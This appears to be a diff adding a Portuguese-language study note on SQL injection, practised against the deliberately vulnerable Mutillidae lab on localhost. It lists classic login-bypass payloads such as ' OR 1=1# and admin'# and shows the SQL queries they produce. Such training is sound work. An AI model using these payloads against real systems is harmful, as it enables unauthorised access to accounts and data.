@@ -1,0 +1,37 @@
+________________________________________________________
+Vamos testar com nosso ambiente de testes do mutillidae:
+http://localhost/mutillidae
+
+Vamos testar:
+    - OWASP 2017 > A1 - Injection(SQL) > SQLi - Extract Data > User Info (SQL)
+
+Forma mais simples de descobrir é colocar caracteres que possam quebrar a query no input de usuário.
+    EX: User: dsdsdsddf  Pass: '
+
+Se conseguirmos visualizar a informação do erro na tela é por que tem uma vulnerabilidade:
+    SQLi In-Band Ou Classic SQLi
+
+Vamos testar algumas injeções com caracteres especiais
+
+EX Query: 
+teste' OR 1=1#
+' OR 1=1--
+admin'#
+
+
+
+
+Injeção 1
+Input: nome= teste’ or 1=1# password=
+Resultado: SELECT * FROM accounts WHERE username=’teste’ OR 1=1#’ AND password=’’;
+
+Injeção 2
+Input: nome= admin’# password=
+Resultado: SELECT * FROM accounts WHERE username=’admin’#’ AND password=’’;
+
+Outras Injeções
+Input: nome= password= teste’ or 1=1#
+Resultado: SELECT * FROM accounts WHERE username=’’ AND password=’teste’ or 1=1#’;
+
+Input: nome= 1’ or ‘1’=’1 password= 1’ or ‘1’=’1
+Resultado: SELECT * FROM accounts WHERE username=’1’ or ‘1’=’1’ AND password=’1’ or ‘1’=’1’;
